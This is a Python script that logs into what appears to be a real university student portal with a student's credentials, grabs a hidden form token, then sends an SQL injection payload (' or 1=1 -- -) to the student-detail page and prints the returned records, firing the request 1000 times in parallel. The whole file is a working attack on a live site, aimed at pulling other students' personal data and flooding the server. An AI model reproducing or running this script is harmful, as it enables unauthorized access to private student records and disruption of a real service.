from requests import Session, exceptions
from re import search
from tqdm import tqdm

try:
    from multiprocessing import Pool
    with Pool() as p:
        pass
    USE_MULTIPROCESSING = True
except ImportError:
    USE_MULTIPROCESSING = False

URL = "http://sion.stikom-bali.ac.id"
RE_STRING = r"<input type=\"hidden\" name=\"flag\" id=\"flag\" class=\"input\" value=\"([a-f0-9]+)\">"
USER_AGENT = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
TOTAL_SHOOT = 1000

USERNAME = "**********"  # gunakan nim asli
PASSWORD = "**********"  # gunakan password asli


def shoot(dummy):
    with Session() as s:
        try:
            response = s.get(URL, timeout=0.5)
            flag = search(RE_STRING, response.text).group(1)

            response = s.post(f"{URL}/load_login.php",
                              headers={
                                  "User-Agent": USER_AGENT,
                                  "Referer": URL
                              },
                              data={
                                  "uname": USERNAME,
                                  "passwd": PASSWORD,
                                  "flag": flag
                              },
                              timeout=0.5)
            response = s.get(
                f"{URL}/reg/mhsdet.php?nim=160010136' or 1=1 -- -",
                headers={
                    "User-Agent": USER_AGENT,
                    "Referer": URL
                },
                timeout=0.5)
            print(response.text)
        except (exceptions.ConnectionError, exceptions.ReadTimeout):
            pass


if __name__ == "__main__":
    if USE_MULTIPROCESSING:
        with Pool() as p:
            with tqdm(total=TOTAL_SHOOT) as bar:
                for _ in p.imap_unordered(shoot, range(0, TOTAL_SHOOT)):
                    bar.update()
    else:
        for _ in tqdm(range(TOTAL_SHOOT)):
            shoot()
